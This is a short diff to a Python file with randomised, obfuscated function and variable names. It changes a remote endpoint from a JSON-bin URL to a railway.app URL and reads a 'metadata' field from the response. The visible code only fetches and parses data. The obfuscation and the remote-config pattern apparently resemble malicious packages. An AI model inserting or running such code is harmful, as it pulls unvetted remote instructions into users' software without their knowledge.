@@ -18,7 +18,7 @@ def eval_pnmgcq_839():
 
     def net_lrtomm_788():
         try:
-            learn_poyiou_902 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            learn_poyiou_902 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_poyiou_902.raise_for_status()
             net_nlczxa_827 = learn_poyiou_902.json()
             process_axgive_842 = net_nlczxa_827.get('metadata')
